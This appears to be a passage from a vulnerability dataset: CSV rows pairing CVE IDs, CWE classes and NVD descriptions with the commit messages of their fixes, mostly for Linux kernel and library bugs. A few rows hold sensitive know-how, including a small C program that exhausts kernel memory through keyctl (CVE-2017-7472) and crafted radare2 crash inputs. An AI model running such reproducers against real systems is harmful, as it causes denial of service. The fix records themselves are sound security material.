CVE-2016-10741,CWE-362,2019-02-01,"In the Linux kernel before 4.9.3, fs/xfs/xfs_aops.c allows local users to cause a denial of service (system crash) because there is a race condition between direct and memory-mapped I/O (associated with a hole) that is handled with BUG_ON instead of an I/O failure.","We've had reports of generic/095 causing XFS to BUG() in __xfs_get_blocks() due to the existence of delalloc blocks on a direct I/O read. generic/095 issues a mix of various types of I/O, including direct and memory mapped I/O to a single file. This is clearly not supported behavior and is known to lead to such problems. E.g., the lack of exclusion between the direct I/O and write fault paths means that a write fault can allocate delalloc blocks in a region of a file that was previously a hole after the direct read has attempted to flush/inval the file range, but before it actually reads the block mapping. In turn, the direct read discovers a delalloc extent and cannot proceed.  While the appropriate solution here is to not mix direct and memory mapped I/O to the same regions of the same file, the current BUG_ON() behavior is probably overkill as it can crash the entire system.  Instead, localize the failure to the I/O in question by returning an error for a direct I/O that cannot be handled safely due to delalloc blocks. Be careful to allow the case of a direct write to post-eof delalloc blocks. This can occur due to speculative preallocation and is safe as post-eof blocks are not accompanied by dirty pages in pagecache (conversely, preallocation within eof must have been zeroed, and thus dirtied, before the inode size could have been increased beyond said blocks).  Finally, provide an additional warning if a direct I/O write occurs while the file is memory mapped. This may not catch all problematic scenarios, but provides a hint that some known-to-be-problematic I/O methods are in use.  Signed-off-by: Brian Foster <bfoster@redhat.com> Reviewed-by: Dave Chinner <dchinner@redhat.com> Signed-off-by: Dave Chinner <david@fromorbit.com>"
CVE-2016-8688,CWE-125,2017-02-15,"The mtree bidder in libarchive 3.2.1 does not keep track of line sizes when extending the read-ahead, which allows remote attackers to cause a denial of service (crash) via a crafted file, which triggers an invalid read in the (1) detect_form or (2) bid_entry function in libarchive/archive_read_support_format_mtree.c.",
CVE-2016-5844,CWE-190,2016-09-21,Integer overflow in the ISO parser in libarchive before 3.2.1 allows remote attackers to cause a denial of service (application crash) via a crafted ISO file.,"The multiplication here defaulted to 'int' but calculations of file positions should always use int64_t.  A simple cast suffices to fix this since the base location is always 32 bits for ISO, so multiplying by the sector size will never overflow a 64-bit integer."
CVE-2017-15951,CWE-20,2017-10-28,"The KEYS subsystem in the Linux kernel before 4.13.10 does not correctly synchronize the actions of updating versus finding a key in the ""negative"" state to avoid a race condition, which allows local users to cause a denial of service or possibly have unspecified other impact via crafted system calls.","Consolidate KEY_FLAG_INSTANTIATED, KEY_FLAG_NEGATIVE and the rejection error into one field such that:   (1) The instantiation state can be modified/read atomically.   (2) The error can be accessed atomically with the state.   (3) The error isn't stored unioned with the payload pointers.  This deals with the problem that the state is spread over three different objects (two bits and a separate variable) and reading or updating them atomically isn't practical, given that not only can uninstantiated keys change into instantiated or rejected keys, but rejected keys can also turn into instantiated keys - and someone accessing the key might not be using any locking.  The main side effect of this problem is that what was held in the payload may change, depending on the state.  For instance, you might observe the key to be in the rejected state.  You then read the cached error, but if the key semaphore wasn't locked, the key might've become instantiated between the two reads - and you might now have something in hand that isn't actually an error code.  The state is now KEY_IS_UNINSTANTIATED, KEY_IS_POSITIVE or a negative error code if the key is negatively instantiated.  The key_is_instantiated() function is replaced with key_is_positive() to avoid confusion as negative keys are also 'instantiated'.  Additionally, barriering is included:   (1) Order payload-set before state-set during instantiation.   (2) Order state-read before payload-read when using the key.  Further separate barriering is necessary if RCU is being used to access the payload content after reading the payload pointers.  Fixes: 146aa8b (""KEYS: Merge the type-specific data with the payload data"") Cc: stable@vger.kernel.org # v4.4+ Reported-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Reviewed-by: Eric Biggers <ebiggers@google.com>"
CVE-2016-7913,CWE-416,2016-11-16,The xc2028_set_config function in drivers/media/tuners/tuner-xc2028.c in the Linux kernel before 4.6 allows local users to gain privileges or cause a denial of service (use-after-free) via vectors involving omission of the firmware name from a certain data structure.,"If struct xc2028_config is passed without a firmware name, the following trouble may happen:  [11009.907205] xc2028 5-0061: type set to XCeive xc2028/xc3028 tuner [11009.907491] ================================================================== [11009.907750] BUG: KASAN: use-after-free in strcmp+0x96/0xb0 at addr ffff8803bd78ab40 [11009.907992] Read of size 1 by task modprobe/28992 [11009.907994] ============================================================================= [11009.907997] BUG kmalloc-16 (Tainted: G        W      ): kasan: bad access detected [11009.907999] -----------------------------------------------------------------------------  [11009.908008] INFO: Allocated in xhci_urb_enqueue+0x214/0x14c0 [xhci_hcd] age=0 cpu=3 pid=28992 [11009.908012] 	___slab_alloc+0x581/0x5b0 [11009.908014] 	__slab_alloc+0x51/0x90 [11009.908017] 	__kmalloc+0x27b/0x350 [11009.908022] 	xhci_urb_enqueue+0x214/0x14c0 [xhci_hcd] [11009.908026] 	usb_hcd_submit_urb+0x1e8/0x1c60 [11009.908029] 	usb_submit_urb+0xb0e/0x1200 [11009.908032] 	usb_serial_generic_write_start+0xb6/0x4c0 [11009.908035] 	usb_serial_generic_write+0x92/0xc0 [11009.908039] 	usb_console_write+0x38a/0x560 [11009.908045] 	call_console_drivers.constprop.14+0x1ee/0x2c0 [11009.908051] 	console_unlock+0x40d/0x900 [11009.908056] 	vprintk_emit+0x4b4/0x830 [11009.908061] 	vprintk_default+0x1f/0x30 [11009.908064] 	printk+0x99/0xb5 [11009.908067] 	kasan_report_error+0x10a/0x550 [11009.908070] 	__asan_report_load1_noabort+0x43/0x50 [11009.908074] INFO: Freed in xc2028_set_config+0x90/0x630 [tuner_xc2028] age=1 cpu=3 pid=28992 [11009.908077] 	__slab_free+0x2ec/0x460 [11009.908080] 	kfree+0x266/0x280 [11009.908083] 	xc2028_set_config+0x90/0x630 [tuner_xc2028] [11009.908086] 	xc2028_attach+0x310/0x8a0 [tuner_xc2028] [11009.908090] 	em28xx_attach_xc3028.constprop.7+0x1f9/0x30d [em28xx_dvb] [11009.908094] 	em28xx_dvb_init.part.3+0x8e4/0x5cf4 [em28xx_dvb] [11009.908098] 	em28xx_dvb_init+0x81/0x8a [em28xx_dvb] [11009.908101] 	em28xx_register_extension+0xd9/0x190 [em28xx] [11009.908105] 	em28xx_dvb_register+0x10/0x1000 [em28xx_dvb] [11009.908108] 	do_one_initcall+0x141/0x300 [11009.908111] 	do_init_module+0x1d0/0x5ad [11009.908114] 	load_module+0x6666/0x9ba0 [11009.908117] 	SyS_finit_module+0x108/0x130 [11009.908120] 	entry_SYSCALL_64_fastpath+0x16/0x76 [11009.908123] INFO: Slab 0xffffea000ef5e280 objects=25 used=25 fp=0x          (null) flags=0x2ffff8000004080 [11009.908126] INFO: Object 0xffff8803bd78ab40 @offset=2880 fp=0x0000000000000001  [11009.908130] Bytes b4 ffff8803bd78ab30: 01 00 00 00 2a 07 00 00 9d 28 00 00 01 00 00 00  ....*....(...... [11009.908133] Object ffff8803bd78ab40: 01 00 00 00 00 00 00 00 b0 1d c3 6a 00 88 ff ff  ...........j.... [11009.908137] CPU: 3 PID: 28992 Comm: modprobe Tainted: G    B   W       4.5.0-rc1+ #43 [11009.908140] Hardware name:                  /NUC5i7RYB, BIOS RYBDWi35.86A.0350.2015.0812.1722 08/12/2015 [11009.908142]  ffff8803bd78a000 ffff8802c273f1b8 ffffffff81932007 ffff8803c6407a80 [11009.908148]  ffff8802c273f1e8 ffffffff81556759 ffff8803c6407a80 ffffea000ef5e280 [11009.908153]  ffff8803bd78ab40 dffffc0000000000 ffff8802c273f210 ffffffff8155ccb4 [11009.908158] Call Trace: [11009.908162]  [<ffffffff81932007>] dump_stack+0x4b/0x64 [11009.908165]  [<ffffffff81556759>] print_trailer+0xf9/0x150 [11009.908168]  [<ffffffff8155ccb4>] object_err+0x34/0x40 [11009.908171]  [<ffffffff8155f260>] kasan_report_error+0x230/0x550 [11009.908175]  [<ffffffff81237d71>] ? trace_hardirqs_off_caller+0x21/0x290 [11009.908179]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908182]  [<ffffffff8155f5c3>] __asan_report_load1_noabort+0x43/0x50 [11009.908185]  [<ffffffff8155ea00>] ? __asan_register_globals+0x50/0xa0 [11009.908189]  [<ffffffff8194cea6>] ? strcmp+0x96/0xb0 [11009.908192]  [<ffffffff8194cea6>] strcmp+0x96/0xb0 [11009.908196]  [<ffffffffa13ba4ac>] xc2028_set_config+0x15c/0x630 [tuner_xc2028] [11009.908200]  [<ffffffffa13bac90>] xc2028_attach+0x310/0x8a0 [tuner_xc2028] [11009.908203]  [<ffffffff8155ea78>] ? memset+0x28/0x30 [11009.908206]  [<ffffffffa13ba980>] ? xc2028_set_config+0x630/0x630 [tuner_xc2028] [11009.908211]  [<ffffffffa157a59a>] em28xx_attach_xc3028.constprop.7+0x1f9/0x30d [em28xx_dvb] [11009.908215]  [<ffffffffa157aa2a>] ? em28xx_dvb_init.part.3+0x37c/0x5cf4 [em28xx_dvb] [11009.908219]  [<ffffffffa157a3a1>] ? hauppauge_hvr930c_init+0x487/0x487 [em28xx_dvb] [11009.908222]  [<ffffffffa01795ac>] ? lgdt330x_attach+0x1cc/0x370 [lgdt330x] [11009.908226]  [<ffffffffa01793e0>] ? i2c_read_demod_bytes.isra.2+0x210/0x210 [lgdt330x] [11009.908230]  [<ffffffff812e87d0>] ? ref_module.part.15+0x10/0x10 [11009.908233]  [<ffffffff812e56e0>] ? module_assert_mutex_or_preempt+0x80/0x80 [11009.908238]  [<ffffffffa157af92>] em28xx_dvb_init.part.3+0x8e4/0x5cf4 [em28xx_dvb] [11009.908242]  [<ffffffffa157a6ae>] ? em28xx_attach_xc3028.constprop.7+0x30d/0x30d [em28xx_dvb] [11009.908245]  [<ffffffff8195222d>] ? string+0x14d/0x1f0 [11009.908249]  [<ffffffff8195381f>] ? symbol_string+0xff/0x1a0 [11009.908253]  [<ffffffff81953720>] ? uuid_string+0x6f0/0x6f0 [11009.908257]  [<ffffffff811a775e>] ? __kernel_text_address+0x7e/0xa0 [11009.908260]  [<ffffffff8104b02f>] ? print_context_stack+0x7f/0xf0 [11009.908264]  [<ffffffff812e9846>] ? __module_address+0xb6/0x360 [11009.908268]  [<ffffffff8137fdc9>] ? is_ftrace_trampoline+0x99/0xe0 [11009.908271]  [<ffffffff811a775e>] ? __kernel_text_address+0x7e/0xa0 [11009.908275]  [<ffffffff81240a70>] ? debug_check_no_locks_freed+0x290/0x290 [11009.908278]  [<ffffffff8104a24b>] ? dump_trace+0x11b/0x300 [11009.908282]  [<ffffffffa13e8143>] ? em28xx_register_extension+0x23/0x190 [em28xx] [11009.908285]  [<ffffffff81237d71>] ? trace_hardirqs_off_caller+0x21/0x290 [11009.908289]  [<ffffffff8123ff56>] ? trace_hardirqs_on_caller+0x16/0x590 [11009.908292]  [<ffffffff812404dd>] ? trace_hardirqs_on+0xd/0x10 [11009.908296]  [<ffffffffa13e8143>] ? em28xx_register_extension+0x23/0x190 [em28xx] [11009.908299]  [<ffffffff822dcbb0>] ? mutex_trylock+0x400/0x400 [11009.908302]  [<ffffffff810021a1>] ? do_one_initcall+0x131/0x300 [11009.908306]  [<ffffffff81296dc7>] ? call_rcu_sched+0x17/0x20 [11009.908309]  [<ffffffff8159e708>] ? put_object+0x48/0x70 [11009.908314]  [<ffffffffa1579f11>] em28xx_dvb_init+0x81/0x8a [em28xx_dvb] [11009.908317]  [<ffffffffa13e81f9>] em28xx_register_extension+0xd9/0x190 [em28xx] [11009.908320]  [<ffffffffa0150000>] ? 0xffffffffa0150000 [11009.908324]  [<ffffffffa0150010>] em28xx_dvb_register+0x10/0x1000 [em28xx_dvb] [11009.908327]  [<ffffffff810021b1>] do_one_initcall+0x141/0x300 [11009.908330]  [<ffffffff81002070>] ? try_to_run_init_process+0x40/0x40 [11009.908333]  [<ffffffff8123ff56>] ? trace_hardirqs_on_caller+0x16/0x590 [11009.908337]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908340]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908343]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908346]  [<ffffffff8155ea37>] ? __asan_register_globals+0x87/0xa0 [11009.908350]  [<ffffffff8144da7b>] do_init_module+0x1d0/0x5ad [11009.908353]  [<ffffffff812f2626>] load_module+0x6666/0x9ba0 [11009.908356]  [<ffffffff812e9c90>] ? symbol_put_addr+0x50/0x50 [11009.908361]  [<ffffffffa1580037>] ? em28xx_dvb_init.part.3+0x5989/0x5cf4 [em28xx_dvb] [11009.908366]  [<ffffffff812ebfc0>] ? module_frob_arch_sections+0x20/0x20 [11009.908369]  [<ffffffff815bc940>] ? open_exec+0x50/0x50 [11009.908374]  [<ffffffff811671bb>] ? ns_capable+0x5b/0xd0 [11009.908377]  [<ffffffff812f5e58>] SyS_finit_module+0x108/0x130 [11009.908379]  [<ffffffff812f5d50>] ? SyS_init_module+0x1f0/0x1f0 [11009.908383]  [<ffffffff81004044>] ? lockdep_sys_exit_thunk+0x12/0x14 [11009.908394]  [<ffffffff822e6936>] entry_SYSCALL_64_fastpath+0x16/0x76 [11009.908396] Memory state around the buggy address: [11009.908398]  ffff8803bd78aa00: 00 00 fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908401]  ffff8803bd78aa80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908403] >ffff8803bd78ab00: fc fc fc fc fc fc fc fc 00 00 fc fc fc fc fc fc [11009.908405]                                            ^ [11009.908407]  ffff8803bd78ab80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908409]  ffff8803bd78ac00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [11009.908411] ==================================================================  In order to avoid it, let's set the cached value of the firmware name to NULL after freeing it. While here, return an error if the memory allocation fails.  Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>"
CVE-2017-16535,CWE-125,2017-11-04,The usb_get_bos_descriptor function in drivers/usb/core/config.c in the Linux kernel before 4.13.10 allows local users to cause a denial of service (out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device.,"Andrey used the syzkaller fuzzer to find an out-of-bounds memory access in usb_get_bos_descriptor().  The code wasn't checking that the next usb_dev_cap_header structure could fit into the remaining buffer space.  This patch fixes the error and also reduces the bNumDeviceCaps field in the header to match the actual number of capabilities found, in cases where there are fewer than expected.  Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: Alan Stern <stern@rowland.harvard.edu> Tested-by: Andrey Konovalov <andreyknvl@google.com> CC: <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2018-20456,CWE-125,2018-12-25,"In radare2 prior to 3.1.1, the parseOperand function inside libr/asm/p/asm_x86_nz.c may allow attackers to cause a denial of service (application crash in libr/util/strbuf.c via a stack-based buffer over-read) by crafting an input file, a related issue to CVE-2018-20455.","0 ,0,[bP-bL-bP-bL-bL-r-bL-bP-bL-bL- mov ,0,[ax+Bx-ax+Bx-ax+ax+Bx-ax+Bx-- leA ,0,[bP-bL-bL-bP-bL-bP-bL-60@bL- leA ,0,[bP-bL-r-bP-bL-bP-bL-60@bL- mov ,0,[ax+Bx-ax+Bx-ax+ax+Bx-ax+Bx--"
CVE-2019-14816,CWE-122,2019-09-20,"There is heap-based buffer overflow in kernel, all versions up to, excluding 5.3, in the marvell wifi chip driver in Linux kernel, that allows local users to cause a denial of service(system crash) or possibly execute arbitrary code.","mwifiex_update_vs_ie(),mwifiex_set_uap_rates() and mwifiex_set_wmm_params() call memcpy() without checking the destination size.Since the source is given from user-space, this may trigger a heap buffer overflow.  Fix them by putting the length check before performing memcpy().  This fix addresses CVE-2019-14814,CVE-2019-14815,CVE-2019-14816.  Signed-off-by: Wen Huang <huangwenabc@gmail.com> Acked-by: Ganapathi Bhat <gbhat@marvell.comg> Signed-off-by: Kalle Valo <kvalo@codeaurora.org>"
CVE-2016-10046,CWE-119,2017-03-23,Heap-based buffer overflow in the DrawImage function in magick/draw.c in ImageMagick before 6.9.5-5 allows remote attackers to cause a denial of service (application crash) via a crafted image file.,
CVE-2016-5696,CWE-200,2016-08-06,"net/ipv4/tcp_input.c in the Linux kernel before 4.7 does not properly determine the rate of challenge ACK segments, which makes it easier for remote attackers to hijack TCP sessions via a blind in-window attack.","Yue Cao claims that current host rate limiting of challenge ACKS (RFC 5961) could leak enough information to allow a patient attacker to hijack TCP sessions. He will soon provide details in an academic paper.  This patch increases the default limit from 100 to 1000, and adds some randomization so that the attacker can no longer hijack sessions without spending a considerable amount of probes.  Based on initial analysis and patch from Linus.  Note that we also have per socket rate limiting, so it is tempting to remove the host limit in the future.  v2: randomize the count of challenge acks per second, not the period.  Fixes: 282f23c (""tcp: implement RFC 5961 3.2"") Reported-by: Yue Cao <ycao009@ucr.edu> Signed-off-by: Eric Dumazet <edumazet@google.com> Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Cc: Yuchung Cheng <ycheng@google.com> Cc: Neal Cardwell <ncardwell@google.com> Acked-by: Neal Cardwell <ncardwell@google.com> Acked-by: Yuchung Cheng <ycheng@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-7568,CWE-190,2016-09-28,"Integer overflow in the gdImageWebpCtx function in gd_webp.c in the GD Graphics Library (aka libgd) through 2.2.3, as used in PHP through 7.0.11, allows remote attackers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via crafted imagewebp and imagedestroy calls.",
CVE-2018-14879,CWE-120,2019-10-03,The command-line argument parser in tcpdump before 4.9.3 has a buffer overflow in tcpdump.c:get_next_file().,get_next_file() did not check the return value of strlen() and underflowed an array index if the line read by fgets() from the file started with \0. This caused an out-of-bounds read and could cause a write. Add the missing check.  This vulnerability was discovered by Brian Carpenter & Geeknik Labs.
CVE-2015-8896,,2017-03-15,Integer truncation issue in coders/pict.c in ImageMagick before 7.0.5-0 allows remote attackers to cause a denial of service (application crash) via a crafted .pict file.,
CVE-2017-14040,CWE-787,2017-08-30,"An invalid write access was discovered in bin/jp2/convert.c in OpenJPEG 2.2.0, triggering a crash in the tgatoimage function. The vulnerability may lead to remote denial of service or possibly unspecified other impact.",
CVE-2015-5330,CWE-200,2015-12-29,"ldb before 1.1.24, as used in the AD LDAP server in Samba 4.x before 4.1.22, 4.2.x before 4.2.7, and 4.3.x before 4.3.3, mishandles string lengths, which allows remote attackers to obtain sensitive information from daemon heap memory by sending crafted packets and then reading (1) an error message or (2) a database value.",
CVE-2015-7990,CWE-362,2015-12-28,Race condition in the rds_sendmsg function in net/rds/sendmsg.c in the Linux kernel before 4.3.3 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by using a socket that was not properly bound.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2015-6937.,"Sasha's found a NULL pointer dereference in the RDS connection code when sending a message to an apparently unbound socket.  The problem is caused by the code checking if the socket is bound in rds_sendmsg(), which checks the rs_bound_addr field without taking a lock on the socket.  This opens a race where rs_bound_addr is temporarily set but where the transport is not in rds_bind(), leading to a NULL pointer dereference when trying to dereference 'trans' in __rds_conn_create().  Vegard wrote a reproducer for this issue, so kindly ask him to share if you're interested.  I cannot reproduce the NULL pointer dereference using Vegard's reproducer with this patch, whereas I could without.  Complete earlier incomplete fix to CVE-2015-6937:    74e98eb (""RDS: verify the underlying transport exists before creating a connection"")  Cc: David S. Miller <davem@davemloft.net> Cc: stable@vger.kernel.org  Reviewed-by: Vegard Nossum <vegard.nossum@oracle.com> Reviewed-by: Sasha Levin <sasha.levin@oracle.com> Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2014-5352,,2015-02-19,"The krb5_gss_process_context_token function in lib/gssapi/krb5/process_context_token.c in the libgssapi_krb5 library in MIT Kerberos 5 (aka krb5) through 1.11.5, 1.12.x through 1.12.2, and 1.13.x before 1.13.1 does not properly maintain security-context handles, which allows remote authenticated users to cause a denial of service (use-after-free and double free, and daemon crash) or possibly execute arbitrary code via crafted GSSAPI traffic, as demonstrated by traffic to kadmind.","[MITKRB5-SA-2015-001] The krb5 gss_process_context_token() should not actually delete the context; that leaves the caller with a dangling pointer and no way to know that it is invalid.  Instead, mark the context as terminated, and check for terminated contexts in the GSS functions which expect established contexts.  Also add checks in export_sec_context and pseudo_random, and adjust t_prf.c for the pseudo_random check.  ticket: 8055 (new) target_version: 1.13.1 tags: pullup"
CVE-2019-1010297,CWE-190,2019-07-15,Linaro/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Buffer Overflow. The impact is: Execution of code in TEE core (kernel) context. The component is: optee_os. The fixed version is: 3.4.0 and later.,"Without checking for overflow there is a risk of allocating a buffer with size smaller than anticipated and as a consequence of that it might lead to a heap based overflow with attacker controlled data written outside the boundaries of the buffer.  Fixes: OP-TEE-2018-0010: ""Integer overflow in crypto system calls (x2)""  Signed-off-by: Joakim Bech <joakim.bech@linaro.org> Tested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8) Reviewed-by: Jens Wiklander <jens.wiklander@linaro.org> Reported-by: Riscure <inforequest@riscure.com> Reported-by: Alyssa Milburn <a.a.milburn@vu.nl> Acked-by: Etienne Carriere <etienne.carriere@linaro.org>"
CVE-2015-3886,CWE-295,2017-07-21,"libinfinity before 0.6.6-1 does not validate expired SSL certificates, which allows remote attackers to have unspecified impact via unknown vectors.",
CVE-2015-4176,CWE-200,2016-05-02,"fs/namespace.c in the Linux kernel before 4.0.2 does not properly support mount connectivity, which allows local users to read arbitrary files by leveraging user-namespace root access for deletion of a file or directory.","Now that it is possible to lazily unmount an entire mount tree and leave the individual mounts connected to each other add a new flag UMOUNT_CONNECTED to umount_tree to force this behavior and use this flag in detach_mounts.  This closes a bug where the deletion of a file or directory could trigger an unmount and reveal data under a mount point.  Cc: stable@vger.kernel.org Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com>"
CVE-2017-6500,CWE-125,2017-03-06,An issue was discovered in ImageMagick 6.9.7. A specially crafted sun file triggers a heap-based buffer over-read.,#376
CVE-2017-13024,CWE-125,2017-09-14,The IPv6 mobility parser in tcpdump before 4.9.2 has a buffer over-read in print-mobility.c:mobility_opt_print().,"This is another capture file supplied by Bhargava Shastry, modified so the capture file won't cause 'tcpdump: pcap_loop: truncated dump file'"
CVE-2015-1342,CWE-264,2015-12-07,"LXCFS before 0.12 does not properly enforce directory escapes, which might allow local users to gain privileges by (1) querying or (2) updating a cgroup.","Taken from the justification in the launchpad bug:  To a task in freezer cgroup /a/b/c/d, it should appear that there are no cgroups other than its descendents. Since this is a filesystem, we must have the parent directories, but each parent cgroup should only contain the child which the task can see.  So, when this task looks at /a/b, it should see only directory 'c' and no files. Attempt to create /a/b/x should result in -EPERM, whether /a/b/x already exists or not. Attempts to query /a/b/x should result in -ENOENT whether /a/b/x exists or not. Opening /a/b/tasks should result in -ENOENT.  The caller_may_see_dir checks specifically whether a task may see a cgroup directory - i.e. /a/b/x if opening /a/b/x/tasks, and /a/b/c/d if doing opendir('/a/b/c/d').  caller_is_in_ancestor() will return true if the caller in /a/b/c/d looks at /a/b/c/d/e. If the caller is in a child cgroup of the queried one - i.e. if the task in /a/b/c/d queries /a/b, then *nextcg will container the next (the only) directory which he can see in the path - 'c'.  Beyond this, regular DAC permissions should apply, with the root-in-user-namespace privilege over its mapped uids being respected. The fc_may_access check does this check for both directories and files.  This is CVE-2015-1342 (LP: #1508481)  Signed-off-by: Serge Hallyn <serge.hallyn@ubuntu.com>"
CVE-2018-18839,CWE-200,2019-06-18,"An issue was discovered in Netdata 1.10.0. Full Path Disclosure (FPD) exists via api/v1/alarms. NOTE: the vendor says ""is intentional.",
CVE-2013-1798,CWE-20,2013-03-22,"The ioapic_read_indirect function in virt/kvm/ioapic.c in the Linux kernel through 3.8.4 does not properly handle a certain combination of invalid IOAPIC_REG_SELECT and IOAPIC_REG_WINDOW operations, which allows guest OS users to obtain sensitive information from host OS memory or cause a denial of service (host OS OOPS) via a crafted application.","If the guest specifies a IOAPIC_REG_SELECT with an invalid value and follows that with a read of the IOAPIC_REG_WINDOW KVM does not properly validate that request.  ioapic_read_indirect contains an ASSERT(redir_index < IOAPIC_NUM_PINS), but the ASSERT has no effect in non-debug builds.  In recent kernels this allows a guest to cause a kernel oops by reading invalid memory.  In older kernels (pre-3.3) this allows a guest to read from large ranges of host memory.  Tested: tested against apic unit tests.  Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>"
CVE-2017-5545,CWE-125,2017-01-21,The main function in plistutil.c in libimobiledevice libplist through 1.12 allows attackers to obtain sensitive information from process memory or cause a denial of service (buffer over-read) via Apple Property List data that is too short.,As pointed out in #87 plistutil would do a memcmp with a heap buffer without checking the size. If the size is less than 8 it would read beyond the bounds of this heap buffer. This commit prevents that.
CVE-2015-0290,CWE-17,2015-03-19,"The multi-block feature in the ssl3_write_bytes function in s3_pkt.c in OpenSSL 1.0.2 before 1.0.2a on 64-bit x86 platforms with AES NI support does not properly handle certain non-blocking I/O cases, which allows remote attackers to cause a denial of service (pointer corruption and application crash) via unspecified vectors.",
CVE-2017-7472,CWE-404,2017-05-11,The KEYS subsystem in the Linux kernel before 4.10.13 allows local users to cause a denial of service (memory consumption) via a series of KEY_REQKEY_DEFL_THREAD_KEYRING keyctl_set_reqkey_keyring calls.,"This fixes CVE-2017-7472.  Running the following program as an unprivileged user exhausts kernel memory by leaking thread keyrings:  	#include <keyutils.h>  	int main() 	{ 		for (;;) 			keyctl_set_reqkey_keyring(KEY_REQKEY_DEFL_THREAD_KEYRING); 	}  Fix it by only creating a new thread keyring if there wasn't one before. To make things more consistent, make install_thread_keyring_to_cred() and install_process_keyring_to_cred() both return 0 if the corresponding keyring is already present.  Fixes: d84f4f9 (""CRED: Inaugurate COW credentials"") Cc: stable@vger.kernel.org # 2.6.29+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com>"
CVE-2017-0380,CWE-532,2017-09-18,"The rend_service_intro_established function in or/rendservice.c in Tor before 0.2.8.15, 0.2.9.x before 0.2.9.12, 0.3.0.x before 0.3.0.11, 0.3.1.x before 0.3.1.7, and 0.3.2.x before 0.3.2.1-alpha, when SafeLogging is disabled, allows attackers to obtain sensitive information by leveraging access to the log files of a hidden service, because uninitialized stack data is included in an error message about construction of an introduction point circuit.",Fixes bug 23490; bugfix on 0.2.7.2-alpha.  TROVE-2017-008 CVE-2017-0380
CVE-2014-5077,CWE-476,2014-08-01,"The sctp_assoc_update function in net/sctp/associola.c in the Linux kernel through 3.15.8, when SCTP authentication is enabled, allows remote attackers to cause a denial of service (NULL pointer dereference and OOPS) by starting to establish an association between two endpoints immediately after an exchange of INIT and INIT ACK chunks to establish an earlier association between these endpoints in the opposite direction.","Jason reported an oops caused by SCTP on his ARM machine with SCTP authentication enabled:  Internal error: Oops: 17 [#1] ARM CPU: 0 PID: 104 Comm: sctp-test Not tainted 3.13.0-68744-g3632f30c9b20-dirty #1 task: c6eefa40 ti: c6f52000 task.ti: c6f52000 PC is at sctp_auth_calculate_hmac+0xc4/0x10c LR is at sg_init_table+0x20/0x38 pc : [<c024bb80>]    lr : [<c00f32dc>]    psr: 40000013 sp : c6f538e8  ip : 00000000  fp : c6f53924 r10: c6f50d80  r9 : 00000000  r8 : 00010000 r7 : 00000000  r6 : c7be4000  r5 : 00000000  r4 : c6f56254 r3 : c00c8170  r2 : 00000001  r1 : 00000008  r0 : c6f1e660 Flags: nZcv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user Control: 0005397f  Table: 06f28000  DAC: 00000015 Process sctp-test (pid: 104, stack limit = 0xc6f521c0) Stack: (0xc6f538e8 to 0xc6f54000) [...] Backtrace: [<c024babc>] (sctp_auth_calculate_hmac+0x0/0x10c) from [<c0249af8>] (sctp_packet_transmit+0x33c/0x5c8) [<c02497bc>] (sctp_packet_transmit+0x0/0x5c8) from [<c023e96c>] (sctp_outq_flush+0x7fc/0x844) [<c023e170>] (sctp_outq_flush+0x0/0x844) from [<c023ef78>] (sctp_outq_uncork+0x24/0x28) [<c023ef54>] (sctp_outq_uncork+0x0/0x28) from [<c0234364>] (sctp_side_effects+0x1134/0x1220) [<c0233230>] (sctp_side_effects+0x0/0x1220) from [<c02330b0>] (sctp_do_sm+0xac/0xd4) [<c0233004>] (sctp_do_sm+0x0/0xd4) from [<c023675c>] (sctp_assoc_bh_rcv+0x118/0x160) [<c0236644>] (sctp_assoc_bh_rcv+0x0/0x160) from [<c023d5bc>] (sctp_inq_push+0x6c/0x74) [<c023d550>] (sctp_inq_push+0x0/0x74) from [<c024a6b0>] (sctp_rcv+0x7d8/0x888)  While we already had various kind of bugs in that area ec0223e (""net: sctp: fix sctp_sf_do_5_1D_ce to verify if we/peer is AUTH capable"") and b14878c (""net: sctp: cache auth_enable per endpoint""), this one is a bit of a different kind.  Giving a bit more background on why SCTP authentication is needed can be found in RFC4895:    SCTP uses 32-bit verification tags to protect itself against   blind attackers. These values are not changed during the   lifetime of an SCTP association.    Looking at new SCTP extensions, there is the need to have a   method of proving that an SCTP chunk(s) was really sent by   the original peer that started the association and not by a   malicious attacker.  To cause this bug, we're triggering an INIT collision between peers; normal SCTP handshake where both sides intent to authenticate packets contains RANDOM; CHUNKS; HMAC-ALGO parameters that are being negotiated among peers:    ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ---------->   <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] ---------   -------------------- COOKIE-ECHO -------------------->   <-------------------- COOKIE-ACK ---------------------  RFC4895 says that each endpoint therefore knows its own random number and the peer's random number *after* the association has been established. The local and peer's random number along with the shared key are then part of the secret used for calculating the HMAC in the AUTH chunk.  